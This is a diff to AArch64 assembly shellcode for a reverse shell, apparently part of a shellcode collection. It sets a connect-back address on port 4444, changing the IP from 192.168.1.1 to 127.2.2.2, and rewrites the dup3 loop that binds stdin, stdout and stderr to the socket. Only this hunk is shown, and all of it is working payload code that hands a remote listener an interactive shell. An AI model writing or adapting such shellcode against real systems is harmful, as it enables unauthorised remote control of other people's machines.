@@ -18,8 +18,8 @@ _start:
 
     movk x1, #0xff02
     movk x1, #0x5c11, lsl #0x10 // Port number = htons(4444)
-    movk x1, #0xa8c0, lsl #0x20 // IP address = htonl(192.168.1.1)
-    movk x1, #0x0101, lsl #0x30
+    movk x1, #0x027f, lsl #0x20 // IP address = htonl(127.2.2.2)
+    movk x1, #0x0202, lsl #0x30
 
     stp x1, xzr, [sp, #-0x40]
 
@@ -35,15 +35,15 @@ _start:
 
     // dup3(clientfd, [0, 1, 2])
 
-    movk x3, #0x0102
+    eor x3, xzr, #0x2
     eor x2, xzr, xzr
+    mov x8, #0x18 // SYS_dup3
 
     dupfd:
         ldr x0, [sp, #-0x10]
         and x1, x3, #0xff
-        mov x8, #0x18 // SYS_dup3
         svc #0x1337
-        lsr x3, x3, #8
+        lsr x3, x3, #1
         cmp xzr, x1
         bne dupfd
 
